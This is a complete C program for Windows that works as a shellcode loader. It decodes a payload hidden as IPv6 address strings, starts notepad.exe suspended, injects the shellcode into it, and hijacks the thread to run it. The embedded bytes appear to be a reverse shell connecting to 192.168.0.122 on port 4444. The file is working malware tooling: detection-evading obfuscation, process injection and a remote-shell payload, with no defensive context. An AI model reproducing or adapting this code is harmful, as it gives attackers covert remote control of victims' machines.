#include <stdio.h>
#include <Windows.h>

// disable error 4996 (caused by sprint)
#pragma warning (disable:4996)

#define TARGET_PROCESS		"notepad.exe"

//hellshell payload 
char* Ipv6Array[] = {
        "FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52", "2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0",
        "AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED", "5241:5148:8B52:208B:423C:4801:D08B:8088", "0000:0048:85C0:7467:4801:D050:8B48:1844",
        "8B40:2049:01D0:E356:48FF:C941:8B34:8848", "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1", "38E0:75F1:4C03:4C24:0845:39D1:75D8:5844",
        "8B40:2449:01D0:6641:8B0C:4844:8B40:1C49", "01D0:418B:0488:4801:D041:5841:585E:595A", "4158:4159:415A:4883:EC20:4152:FFE0:5841",
        "595A:488B:12E9:57FF:FFFF:5D49:BE77:7332", "5F33:3200:0041:5649:89E6:4881:ECA0:0100", "0049:89E5:49BC:0200:115C:C0A8:007A:4154",
        "4989:E44C:89F1:41BA:4C77:2607:FFD5:4C89", "EA68:0101:0000:5941:BA29:806B:00FF:D550", "504D:31C9:4D31:C048:FFC0:4889:C248:FFC0",
        "4889:C141:BAEA:0FDF:E0FF:D548:89C7:6A10", "4158:4C89:E248:89F9:41BA:99A5:7461:FFD5", "4881:C440:0200:0049:B863:6D64:0000:0000",
        "0041:5041:5048:89E2:5757:574D:31C0:6A0D", "5941:50E2:FC66:C744:2454:0101:488D:4424", "18C6:0068:4889:E656:5041:5041:5041:5049",
        "FFC0:4150:49FF:C84D:89C1:4C89:C141:BA79", "CC3F:86FF:D548:31D2:48FF:CA8B:0E41:BA08", "871D:60FF:D5BB:F0B5:A256:41BA:A695:BD9D",
        "FFD5:4883:C428:3C06:7C0A:80FB:E075:05BB", "4713:726F:6A00:5941:89DA:FFD5:9090:9090"
};

#define NumberOfElements 29


typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
    PCSTR                   S,
    PCSTR* Terminator,
    PVOID                   Addr
    );


BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE           pBuffer = NULL,
        TmpBuffer = NULL;

    SIZE_T          sBuffSize = NULL;

    PCSTR           Terminator = NULL;

    NTSTATUS        STATUS = NULL;

    // getting RtlIpv6StringToAddressA  address from ntdll.dll
    fnRtlIpv6StringToAddressA  pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");
    if (pRtlIpv6StringToAddressA == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    // getting the real size of the shellcode (number of elements * 16 => original shellcode size)
    sBuffSize = NmbrOfElements * 16;
    // allocating mem, that will hold the deobfuscated shellcode
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    // setting TmpBuffer to be equal to pBuffer
    TmpBuffer = pBuffer;


    // loop through all the addresses saved in Ipv6Array
    for (int i = 0; i < NmbrOfElements; i++) {
        // Ipv6Array[i] is a single ipv6 address from the array Ipv6Array
        if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {
            // if failed ...
            printf("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X\n", Ipv6Array[i], STATUS);
            return FALSE;
        }

        // tmp buffer will be used to point to where to write next (in the newly allocated memory)
        TmpBuffer = (PBYTE)(TmpBuffer + 16);
    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;
    return TRUE;
}

BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
    
    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    STARTUPINFO Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    //cleaning the structs by setting the member values to zero
    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    //setting the size of a structure
    Si.cb = sizeof(STARTUPINFO);

    //getting the value of the %windir) env variable
    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        printf("[!] GetEnvironmentVariableA failed with error: %d\n", GetLastError());
        return FALSE;
    }

    //create full target process path
    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
    printf("\n\t[i] Running: \"%s\" ...", lpPath);

    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &Si, &Pi)) {
        printf("[!] CreateProcessA failed with error: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] DONE!\n");

    //populate the OUT params with CreateProcessA output
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}

BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {

    SIZE_T sNumberOfBytesWritten = NULL;
    DWORD dwOldProtection = NULL;

    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        printf("\n\t[!] VirtualAllocEx failed with error: %d\n", GetLastError());
        return FALSE;
    }
    printf("[i] Allocated memory at 0x%p\n", *ppAddress);

    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        printf("\n\t[!] WriteProcessMemory failed with error: %d\n", GetLastError());
        return FALSE;
    }

    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("\n\t[!] VirtualProtectEx failed with error: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {
    CONTEXT ThreadCtx = {
        .ContextFlags = CONTEXT_CONTROL
    };

    // getting the original thread context
    if (!GetThreadContext(hThread, &ThreadCtx)) {
        printf("\n\t[!] GetThreadContext failed with error: %d\n", GetLastError());
        return FALSE;
    }

    //update the RIP to be equal to shellcode address
    ThreadCtx.Rip = pAddress;

    // setting the new updated thread context
    if (!SetThreadContext(hThread, &ThreadCtx)) {
        printf("\n\t[!] SetThreadContext failed with error: %d\n", GetLastError());
        return FALSE;
    }

    //resume suspended thread
    ResumeThread(hThread);
    WaitForSingleObject(hThread, INFINITE);
    return TRUE;
}

int main()
{
    //0. Deobfuscate shellcode
    //1. new process created in suspended state using CreateProcessA, which created all of its thread in suspended state as well
    //2. payload was injected into the newly created process using VirtualAllocEx and WriteProcessMemory (but not executed)
    //3. Used the thread handle returned from CreateProcessA to execute the payload via thread hijacking

    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PVOID pAddress = NULL;
    DWORD dwProcessId = NULL;

    PBYTE Payload = NULL;
    SIZE_T sPayload = NULL;

    //deobfuscation
    if (!Ipv6Deobfuscation(Ipv6Array, NumberOfElements, &Payload, &sPayload))
    {
        return -1;
    }

    //create process in suspended state
    if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
        return -1;
    }
    printf("\t\n[i] Target Process Created With Pid : %d \n", dwProcessId);

    //inject that shellcode of yours
    if (!InjectShellcodeToRemoteProcess(hProcess, Payload, sPayload, &pAddress)) {
        return -1;
    }
    printf("\t\n[i] Shellcode injected into remote process\n");

    //execute payload via thread hijacking
    if (!HijackThread(hThread, pAddress)) {
        return -1;
    }

    printf("\t\n[#] Done! Press ENTER to quit...\n");
    getchar();

    return 0;
}

